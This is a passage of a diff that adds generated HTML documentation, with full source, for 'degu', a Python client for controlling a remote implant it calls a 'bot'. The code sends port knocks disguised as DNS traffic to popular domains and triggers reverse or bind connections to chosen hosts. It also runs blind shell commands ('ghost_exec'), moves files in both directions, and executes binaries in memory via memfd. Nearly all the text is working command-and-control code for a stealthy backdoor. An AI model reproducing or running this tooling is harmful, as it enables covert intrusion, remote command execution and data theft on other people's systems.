+    &#34;twitter.com&#34;,&#34;live.com&#34;,&#34;instagram.com&#34;,&#34;reddit.com&#34;,&#34;linkedin.com&#34;,&#34;blogspot.com&#34;,&#34;netflix.com&#34;,
+    &#34;twitch.tv&#34;,&#34;whatsapp.com&#34;,&#34;microsoft.com&#34;,&#34;bing.com&#34;,&#34;ebay.com&#34;,&#34;github.com&#34;,&#34;stackoverflow.com&#34;,
+    &#34;office.com&#34;,&#34;msn.com&#34;,&#34;paypal.com&#34;,&#34;imgur.com&#34;,&#34;wordpress.com&#34;,&#34;apple.com&#34;,&#34;dropbox.com&#34;,
+    &#34;tumblr.com&#34;,&#34;bbc.com&#34;,&#34;force.com&#34;,&#34;salesforce.com&#34;,&#34;roblox.com&#34;,&#34;spotify.com&#34;,&#34;soundcloud.com&#34;,
+    &#34;discordapp.com&#34;,&#34;medium.com&#34;,&#34;mediafire.com&#34;,&#34;godaddy.com&#34;,&#34;etsy.com&#34;,&#34;duckduckgo.com&#34;,
+    &#34;slack.com&#34;,&#34;dailymotion.com&#34;,&#34;speedtest.net&#34;,&#34;blogger.com&#34;]
+
+    transac_id = struct.pack(&#34;H&#34;,random.randint(0,65535))
+    flags = b&#34;\x01\x00\x00\x01\x00\x00\x00\x00\x00&#34;
+    name = random.choice(names)
+    len_name = struct.pack(&#34;&gt;H&#34;,len(name))
+    rest = b&#34;\x00\x01\x00\x01&#34;
+    dns_data = transac_id + flags + len_name + name.encode() + rest + 32*b&#34;\x00&#34;
+    return dns_data[:32]</code></pre>
+</details>
+</dd>
+</dl>
+</section>
+<section>
+<h2 class="section-title" id="header-classes">Classes</h2>
+<dl>
+<dt id="degu.LogFmt"><code class="flex name class">
+<span>class <span class="ident">LogFmt</span></span>
+</code></dt>
+<dd>
+<div class="desc"><p>class for log formating </p>
+<p>Initialize the formatter with specified format strings.</p>
+<p>Initialize the formatter either with the specified format string, or a
+default as described above. Allow for specialized date formatting with
+the optional datefmt argument. If datefmt is omitted, you get an
+ISO8601-like (or RFC 3339-like) format.</p>
+<p>Use a style parameter of '%', '{' or '$' to specify that you want to
+use one of %-formatting, :meth:<code>str.format</code> (<code>{}</code>) formatting or
+:class:<code>string.Template</code> formatting in your format string.</p>
+<div class="admonition versionchanged">
+<p class="admonition-title">Changed in version:&ensp;3.2</p>
+<p>Added the <code>style</code> parameter.</p>
+</div></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">class LogFmt(logging.Formatter):
+    &#34;&#34;&#34; class for log formating &#34;&#34;&#34;
+
+    def __init__(self):
+        logging.Formatter.__init__(self)
+
+    def format_time(self):
+        &#34;&#34;&#34; format time &#34;&#34;&#34;
+        return time.strftime(&#34;%H:%M.%S&#34;)
+
+    def _l(self,level):
+        clevel = {&#34;DEBUG&#34;    :  (&#34;\033[0;36m&#34;,&#34;\033[1;36m&#34;),
+          &#34;INFO&#34;     :  (&#34;\033[0;37m&#34;,&#34;\033[1;37m&#34;),
+          &#34;WARNING&#34;  :  (&#34;\033[0;31m&#34;,&#34;\033[1;31m&#34;),
+          &#34;CRITICAL&#34; :  (&#34;\033[0;31m&#34;,&#34;\033[1;31m&#34;),
+          &#34;ERROR&#34;    :  (&#34;\033[0;31m&#34;,&#34;\033[1;31m&#34;),
+          }
+        return clevel[level]
+
+    def format(self,record):
+        header = self._l(record.levelname)[0] + &#34;[&#34; + self._l(record.levelname)[1] + &#34;%8s&#34;%record.levelname \
+               + self._l(record.levelname)[1] + &#34;  &#34; + self.format_time() + &#34;][%-5s]: &#34; % record.name + &#34;\033[0m&#34;
+        return header + &#34;\033[0m&#34; + record.msg</code></pre>
+</details>
+<h3>Ancestors</h3>
+<ul class="hlist">
+<li>logging.Formatter</li>
+</ul>
+<h3>Methods</h3>
+<dl>
+<dt id="degu.LogFmt.format"><code class="name flex">
+<span>def <span class="ident">format</span></span>(<span>self, record)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Format the specified record as text.</p>
+<p>The record's attribute dictionary is used as the operand to a
+string formatting operation which yields the returned string.
+Before formatting the dictionary, a couple of preparatory steps
+are carried out. The message attribute of the record is computed
+using LogRecord.getMessage(). If the formatting string uses the
+time (as determined by a call to usesTime(), formatTime() is
+called to format the event time. If there is exception information,
+it is formatted using formatException() and appended to the message.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def format(self,record):
+    header = self._l(record.levelname)[0] + &#34;[&#34; + self._l(record.levelname)[1] + &#34;%8s&#34;%record.levelname \
+           + self._l(record.levelname)[1] + &#34;  &#34; + self.format_time() + &#34;][%-5s]: &#34; % record.name + &#34;\033[0m&#34;
+    return header + &#34;\033[0m&#34; + record.msg</code></pre>
+</details>
+</dd>
+<dt id="degu.LogFmt.format_time"><code class="name flex">
+<span>def <span class="ident">format_time</span></span>(<span>self)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>format time</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def format_time(self):
+    &#34;&#34;&#34; format time &#34;&#34;&#34;
+    return time.strftime(&#34;%H:%M.%S&#34;)</code></pre>
+</details>
+</dd>
+</dl>
+</dd>
+<dt id="degu.degu"><code class="flex name class">
+<span>class <span class="ident">degu</span></span>
+<span>(</span><span>host, priv, kport=53, lib='../degu.so')</span>
+</code></dt>
+<dd>
+<div class="desc"><p>main degu object</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>host</code></strong> :&ensp;<code>str</code></dt>
+<dd>ip addr or hostname of degu server</dd>
+<dt><strong><code>priv</code></strong> :&ensp;<code>str</code></dt>
+<dd>hex stream of private data key (01020304....)</dd>
+<dt><strong><code>kport</code></strong> :&ensp;<code>int</code></dt>
+<dd>custom knock port for non root degu . Defaults to 53 for root usage.</dd>
+<dt><strong><code>lib</code></strong> :&ensp;<code>str</code>, optional</dt>
+<dd>degu.so library location . Defaults to DEGU global variable.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">class degu(object):
+    def __init__(self,host,priv,kport=53,lib=DEGU):
+        &#34;&#34;&#34;main degu object
+
+        Args:
+            host (str): ip addr or hostname of degu server
+            priv (str): hex stream of private data key (01020304....)
+            kport (int): custom knock port for non root degu . Defaults to 53 for root usage.
+            lib (str, optional): degu.so library location . Defaults to DEGU global variable.
+        &#34;&#34;&#34;        
+        self.priv = binascii.unhexlify(priv)
+        self.lib = lib
+        self.log = logging.getLogger(__name__)
+        try:
+            os.putenv(&#34;_LC&#34;,&#34;1&#34;)
+            self.lib =  ctypes.CDLL(self.lib)
+        except OSError:
+            self.log.error(&#34;no degu lib found&#34;)
+            sys.exit(-1)
+        self.host = host
+        self.kport = kport
+        self.bot_pubkey = None
+        self.s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+    def xbuf(self,data):
+        &#34;&#34;&#34;encrypt/decrypt data with session context
+
+        Args:
+            data (byte): data to cipher with current aes context
+
+        Returns:
+            byte: ciphered data
+        &#34;&#34;&#34;        
+        if not data:
+            return None
+        self.lib.xbuf(self.bot_pubkey,self.priv,data,len(data))
+        return data
+
+    def xcrypt_knock(self,data):
+        &#34;&#34;&#34;encrypt knock data with knock key
+
+        Args:
+            data (byte): knock to cipher/decipher
+
+        Returns:
+            byte: ciphered/deciphered data
+        &#34;&#34;&#34;        
+        
+        self.lib.xnock(data,len(data))
+        return data
+
+    def sign_msg(self,data):
+        &#34;&#34;&#34;get data signature
+
+        Args:
+            data (byte): data to sign
+
+        Returns:
+            byte: signature
+        &#34;&#34;&#34;        
+        sig = ctypes.create_string_buffer(64)
+        self.lib.xsig(sig,data,len(data),self.priv)
+        return sig.raw
+
+    def mkbuf_knock(self,addr):
+        &#34;&#34;&#34;make knock message
+
+        Args:
+            addr (byte): target host
+
+        Returns:
+            byte: ciphered knock buffer with DNS header
+        &#34;&#34;&#34;        
+
+        buf_rand = mock_dns()
+        self.xcrypt_knock(buf_rand)
+        self.log.debug(&#34;knocking %s&#34;%addr)
+        payload = None
+        if addr.startswith(b&#34;:&#34;):
+            try:
+                port = int(addr[1:])
+                self.port = port
+                self.log.debug(&#34;trying remote bind on %s:%i&#34;%(self.host,port))
+                f = struct.pack(&#34;H&#34;,port)
+                payload = buf_rand + b&#34;\xb0\x0b&#34; + f + b&#34;\0&#34;*1000
+            except ValueError:
+                self.log.error(f&#34;Port {addr[1:]} is invalid&#34;)
+        else:
+            try:
+                sip,sport = addr.split(b&#34;:&#34;)
+                self.log.debug(f&#34;trying backconnect on {sip}:{sport}&#34;)
+                ip = bytes(map(int, sip.split(b&#39;.&#39;)))
+                port = int(sport)
+                f = struct.pack(&#34;H&#34;,port)
+                payload = buf_rand + b&#34;\xc4\x11&#34; + ip + f + b&#34;\0&#34;*1000
+            except Exception as exc:
+                self.log.error(&#34;addr %s is invalid : %s&#34;%(addr,exc))
+        if payload:
+            return self.xcrypt_knock( payload )
+        return None
+
+    def mkbuf_upload( self, file , path, pub ):
+        &#34;&#34;&#34;make upload buffer
+
+        Args:
+            file (byte): local filename to read
+            path (byte): remote path to use for upload
+            pub (byte): public key of degu instance
+
+        Returns:
+            byte: ciphered upload data command
+        &#34;&#34;&#34;        
+
+        if not self.bot_pubkey :
+            self.bot_pubkey = self.xcrypt_knock( pub )
+        data = create_up_string( path , file )
+        return self.xbuf( data )
+        
+    def mkbuf_mem_exec(self, bin, param, pub, memfd=False):
+        &#34;&#34;&#34;make memexec buffer
+
+        Args:
+            bin (byte): binary to send
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            pub (byte): public key of degu instance
+            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+        Returns:
+            byte: encrypted byte buffer to send
+
+        &#34;&#34;&#34;        
+    
+        if not self.bot_pubkey :
+            self.bot_pubkey = self.xcrypt_knock( pub )
+        data = create_bin_string( bin, param, memfd=memfd )
+        return self.xbuf( data )
+
+    def mkbuf_download(self,path,pub):
+        &#34;&#34;&#34; make download buffer
+
+        Args:
+            path (byte): file path on server to download
+            pub (byte): public key of degu instance
+
+        Returns:
+            byte: encrypted byte buffer to send
+        &#34;&#34;&#34;
+        if not self.bot_pubkey :            
+            self.bot_pubkey = self.xcrypt_knock(pub) ## here for user !!!!
+        data = create_dl_string( path )
+        return self.xbuf(data)
+
+    def mkbuf_ghost_exec(self,mycmd):
+        &#34;&#34;&#34;make ghost exec buffer
+
+        Args:
+            mycmd (byte): raw shell command
+
+        Returns:
+            byte: encrypted byte buffer to send
+        &#34;&#34;&#34;        
+
+        rand = mock_dns()
+        self.xcrypt_knock(rand)
+        sig  = self.sign_msg(mycmd)
+        payload = rand + b&#34;\xc0\x57&#34; + struct.pack(&#34;H&#34;,len(mycmd)) +  mycmd + sig + b&#39;\x00&#39;*1000
+        return self.xcrypt_knock(payload)
+
+    def rdownload(self,path,lport,timeout=5):
+        &#34;&#34;&#34; reverse connect download file from bot to client
+
+        Args:
+            path (byte): file path on server to download
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file receive. Defaults to 5.
+
+        Returns:
+            byte: contents of file or None if error
+        &#34;&#34;&#34;        
+
+        self.log.info(f&#34;CB downloading {path.decode()}&#34;)
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        pub = s.recv(32)
+        data = self.mkbuf_download(path,pub)
+        s.send(data)
+        recvdata = b&#34;&#34;
+        while 1:
+            tmp = s.recv(4096)
+            if tmp :
+                recvdata += tmp
+            else :
+                break
+        if len(recvdata) &gt; 4:
+            self.xbuf(recvdata)
+            lmsg = struct.unpack(&#34;&gt;I&#34;,recvdata[:4])[0]
+            s.close()
+            return recvdata[4:lmsg+4]
+        else:
+            self.log.error(&#34;no recv :(&#34;)
+        s.close()
+        return None
+
+    def download(self, path ):
+        &#34;&#34;&#34; bind connect download file from bot to client
+
+        Args:
+            path (byte): file path on server to download
+
+        Returns:
+            byte: contents of file or None if error
+        &#34;&#34;&#34;        
+        
+        self.log.info(f&#34;Downloading {path.decode()}&#34;)
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_download(path,pub)
+        s.send(data)
+        recvdata = b&#34;&#34;
+        while 1:
+            tmp = s.recv(4096)
+            if tmp :
+                recvdata += tmp
+            else :
+                break
+        if len(recvdata) &gt; 4:
+            self.xbuf(recvdata)
+            lmsg = struct.unpack(&#34;&gt;I&#34;,recvdata[:4])[0]
+            s.close()
+            return recvdata[4:lmsg+4]
+        else:
+            self.log.error(&#34;no recv :(&#34;)
+        s.close()
+        return None
+
+    def upload(self, file , path ):
+        &#34;&#34;&#34;bind connect upload file from client to bot
+
+        Args:
+            file (byte): local filename to read
+            path (byte): remote path to use for upload
+        Returns:
+            int: len of uploaded data or None
+        &#34;&#34;&#34;        
+        self.log.info(f&#34;Uploading {file.decode()} {path.decode()}&#34;)
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_upload(file, path, pub)
+        if not data :
+            return None
+        ret = s.send(data)
+        s.close()
+        return ret
+
+    def rupload(self, file , path, lport, timeout=5 ):
+        &#34;&#34;&#34; reverse connect upload file from client to bot
+
+        Args:
+            file (byte): local filename to read
+            path (byte): remote path to use for upload
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file send. Defaults to 5.
+
+        Returns:
+            int: len of uploaded data or None
+        &#34;&#34;&#34;        
+
+        self.log.info(f&#34;cb Uploading {file.decode()} {path.decode()}&#34;)
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_upload(file, path, pub)
+        if not data :
+            return None
+        ret = s.send(data)
+        s.close()
+        return ret
+
+    def helper(self, bin, param, memfd=False):
+        &#34;&#34;&#34; bind connect execute binary in memory and return socket for reuse
+
+        Args:
+            bin (byte): helper binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+        Returns:
+            socket: socket object from degu session
+        &#34;&#34;&#34;        
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub, memfd=memfd)
+        s.send(data)
+        return s
+
+    def rhelper(self, bin, param, lport, timeout=5, memfd=False):
+        &#34;&#34;&#34; reverse connect execute binary in memory and return socket for reuse
+
+        Args:
+            bin (byte): helper binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file send. Defaults to 5.
+            memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+        Returns:
+            socket: socket object from degu session
+        &#34;&#34;&#34;
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub,memfd=memfd)
+        s.send(data)
+        return s
+
+    def mem_exec(self, bin, param):
+        &#34;&#34;&#34; bind connect execute binary in memory and close socket
+
+        Args:
+            bin (byte): executable binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+        &#34;&#34;&#34;        
+
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub)
+        s.send(data)
+        s.close()
+
+    def rmem_exec(self, bin, param, lport, timeout=5):
+        &#34;&#34;&#34; reverse connect execute binary in memory and close socket
+
+        Args:
+            bin (byte): executable binary to use
+            param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+            lport (int): local port to listen to
+            timeout (int, optional): timeout to file send. Defaults to 5.
+        &#34;&#34;&#34;
+        self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(bin, param, pub)
+        s.send(data)
+        s.close()
+
+    def knock(self,data):
+        &#34;&#34;&#34; send knock to bot
+
+        Args:
+            data (byte): knock message ip:port for cb or just :port for bind
+        &#34;&#34;&#34;        
+
+        buf = self.mkbuf_knock(data)
+        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        s.sendto(buf,0,(self.host,self.kport))
+        s.close()
+
+    def ghost_exec(self, mycmd):
+        &#34;&#34;&#34; execute system() command on bot, limited cmd to 1300 char no return
+
+        Args:
+            mycmd (byte): shell command
+        &#34;&#34;&#34;        
+
+        self.log.info(f&#34;ghost executing {mycmd}&#34;)
+        buf = self.mkbuf_ghost_exec(mycmd)
+        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+        self.log.debug(&#34;executing : %s&#34;%mycmd)
+        s.sendto(buf,0,(self.host,self.kport))
+        s.close()
+
+    def __str__(self):
+        return f&#34;&lt;DEGU ({self.host})&gt;&#34;
+
+    def __repr__(self):
+        return f&#34;&lt;DEGU ({self.host})&gt;&#34;
+
+    @staticmethod
+    def getpub():
+        &#34;&#34;&#34; get degu internal info &#34;&#34;&#34;
+        lib = ctypes.CDLL(DEGU)
+        lib.xpub()
+
+    @staticmethod
+    def keygen():
+        &#34;&#34;&#34; degu keygen function &#34;&#34;&#34;
+        file = &#39;/tmp/.&#39; + &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
+        lib =  ctypes.CDLL(DEGU)
+        lib.keygen(file.encode())
+        toexec = open(file,&#34;rb&#34;).read()
+        exec( toexec, globals() )
+        os.unlink(file)
+        tiv  = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(iv)]
+        tkno = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(knock)]
+        tpub = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(pub)]
+        ret  = &#34;#define IV            { &#34; + &#34;,&#34;.join(tiv) + &#34;}\n&#34;
+        ret += &#34;#define KNOCK_KEY     { &#34; + &#34;,&#34;.join(tkno) + &#34;}\n&#34;
+        ret += &#34;#define MASTER_PUBKEY { &#34; + &#34;,&#34;.join(tpub) + &#34;}\n&#34;
+        ret += f&#39;\n// PRIVATE_KEY=&#34;{priv}&#34;\n&#39;
+        return ret</code></pre>
+</details>
+<h3>Static methods</h3>
+<dl>
+<dt id="degu.degu.getpub"><code class="name flex">
+<span>def <span class="ident">getpub</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>get degu internal info</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def getpub():
+    &#34;&#34;&#34; get degu internal info &#34;&#34;&#34;
+    lib = ctypes.CDLL(DEGU)
+    lib.xpub()</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.keygen"><code class="name flex">
+<span>def <span class="ident">keygen</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>degu keygen function</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">@staticmethod
+def keygen():
+    &#34;&#34;&#34; degu keygen function &#34;&#34;&#34;
+    file = &#39;/tmp/.&#39; + &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
+    lib =  ctypes.CDLL(DEGU)
+    lib.keygen(file.encode())
+    toexec = open(file,&#34;rb&#34;).read()
+    exec( toexec, globals() )
+    os.unlink(file)
+    tiv  = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(iv)]
+    tkno = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(knock)]
+    tpub = [&#34;0x%02x&#34;%c for c in binascii.unhexlify(pub)]
+    ret  = &#34;#define IV            { &#34; + &#34;,&#34;.join(tiv) + &#34;}\n&#34;
+    ret += &#34;#define KNOCK_KEY     { &#34; + &#34;,&#34;.join(tkno) + &#34;}\n&#34;
+    ret += &#34;#define MASTER_PUBKEY { &#34; + &#34;,&#34;.join(tpub) + &#34;}\n&#34;
+    ret += f&#39;\n// PRIVATE_KEY=&#34;{priv}&#34;\n&#39;
+    return ret</code></pre>
+</details>
+</dd>
+</dl>
+<h3>Methods</h3>
+<dl>
+<dt id="degu.degu.download"><code class="name flex">
+<span>def <span class="ident">download</span></span>(<span>self, path)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>bind connect download file from bot to client</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>file path on server to download</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>contents of file or None if error</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def download(self, path ):
+    &#34;&#34;&#34; bind connect download file from bot to client
+
+    Args:
+        path (byte): file path on server to download
+
+    Returns:
+        byte: contents of file or None if error
+    &#34;&#34;&#34;        
+    
+    self.log.info(f&#34;Downloading {path.decode()}&#34;)
+    s = socket.socket()
+    s.connect((self.host,self.port))
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+    pub = s.recv(32)
+    data = self.mkbuf_download(path,pub)
+    s.send(data)
+    recvdata = b&#34;&#34;
+    while 1:
+        tmp = s.recv(4096)
+        if tmp :
+            recvdata += tmp
+        else :
+            break
+    if len(recvdata) &gt; 4:
+        self.xbuf(recvdata)
+        lmsg = struct.unpack(&#34;&gt;I&#34;,recvdata[:4])[0]
+        s.close()
+        return recvdata[4:lmsg+4]
+    else:
+        self.log.error(&#34;no recv :(&#34;)
+    s.close()
+    return None</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.ghost_exec"><code class="name flex">
+<span>def <span class="ident">ghost_exec</span></span>(<span>self, mycmd)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>execute system() command on bot, limited cmd to 1300 char no return</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>mycmd</code></strong> :&ensp;<code>byte</code></dt>
+<dd>shell command</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def ghost_exec(self, mycmd):
+    &#34;&#34;&#34; execute system() command on bot, limited cmd to 1300 char no return
+
+    Args:
+        mycmd (byte): shell command
+    &#34;&#34;&#34;        
+
+    self.log.info(f&#34;ghost executing {mycmd}&#34;)
+    buf = self.mkbuf_ghost_exec(mycmd)
+    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+    self.log.debug(&#34;executing : %s&#34;%mycmd)
+    s.sendto(buf,0,(self.host,self.kport))
+    s.close()</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.helper"><code class="name flex">
+<span>def <span class="ident">helper</span></span>(<span>self, bin, param, memfd=False)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>bind connect execute binary in memory and return socket for reuse</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>bin</code></strong> :&ensp;<code>byte</code></dt>
+<dd>helper binary to use</dd>
+<dt><strong><code>param</code></strong> :&ensp;<code>byte[]</code></dt>
+<dd>arguments to binary don't forget args[0] for exe name</dd>
+<dt><strong><code>memfd</code></strong> :&ensp;<code>bool</code>, optional</dt>
+<dd>use memfd instead of ulexec. Defaults to False.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>socket</code></dt>
+<dd>socket object from degu session</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def helper(self, bin, param, memfd=False):
+    &#34;&#34;&#34; bind connect execute binary in memory and return socket for reuse
+
+    Args:
+        bin (byte): helper binary to use
+        param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+    Returns:
+        socket: socket object from degu session
+    &#34;&#34;&#34;        
+    self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+    s = socket.socket()
+    s.connect((self.host,self.port))
+    pub = s.recv(32)
+    data = self.mkbuf_mem_exec(bin, param, pub, memfd=memfd)
+    s.send(data)
+    return s</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.knock"><code class="name flex">
+<span>def <span class="ident">knock</span></span>(<span>self, data)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>send knock to bot</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>data</code></strong> :&ensp;<code>byte</code></dt>
+<dd>knock message ip:port for cb or just :port for bind</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def knock(self,data):
+    &#34;&#34;&#34; send knock to bot
+
+    Args:
+        data (byte): knock message ip:port for cb or just :port for bind
+    &#34;&#34;&#34;        
+
+    buf = self.mkbuf_knock(data)
+    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+    s.sendto(buf,0,(self.host,self.kport))
+    s.close()</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.mem_exec"><code class="name flex">
+<span>def <span class="ident">mem_exec</span></span>(<span>self, bin, param)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>bind connect execute binary in memory and close socket</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>bin</code></strong> :&ensp;<code>byte</code></dt>
+<dd>executable binary to use</dd>
+<dt><strong><code>param</code></strong> :&ensp;<code>byte[]</code></dt>
+<dd>arguments to binary don't forget args[0] for exe name</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mem_exec(self, bin, param):
+    &#34;&#34;&#34; bind connect execute binary in memory and close socket
+
+    Args:
+        bin (byte): executable binary to use
+        param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+    &#34;&#34;&#34;        
+
+    self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+    s = socket.socket()
+    s.connect((self.host,self.port))
+    pub = s.recv(32)
+    data = self.mkbuf_mem_exec(bin, param, pub)
+    s.send(data)
+    s.close()</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.mkbuf_download"><code class="name flex">
+<span>def <span class="ident">mkbuf_download</span></span>(<span>self, path, pub)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>make download buffer</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>file path on server to download</dd>
+<dt><strong><code>pub</code></strong> :&ensp;<code>byte</code></dt>
+<dd>public key of degu instance</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>encrypted byte buffer to send</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mkbuf_download(self,path,pub):
+    &#34;&#34;&#34; make download buffer
+
+    Args:
+        path (byte): file path on server to download
+        pub (byte): public key of degu instance
+
+    Returns:
+        byte: encrypted byte buffer to send
+    &#34;&#34;&#34;
+    if not self.bot_pubkey :            
+        self.bot_pubkey = self.xcrypt_knock(pub) ## here for user !!!!
+    data = create_dl_string( path )
+    return self.xbuf(data)</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.mkbuf_ghost_exec"><code class="name flex">
+<span>def <span class="ident">mkbuf_ghost_exec</span></span>(<span>self, mycmd)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>make ghost exec buffer</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>mycmd</code></strong> :&ensp;<code>byte</code></dt>
+<dd>raw shell command</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>encrypted byte buffer to send</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mkbuf_ghost_exec(self,mycmd):
+    &#34;&#34;&#34;make ghost exec buffer
+
+    Args:
+        mycmd (byte): raw shell command
+
+    Returns:
+        byte: encrypted byte buffer to send
+    &#34;&#34;&#34;        
+
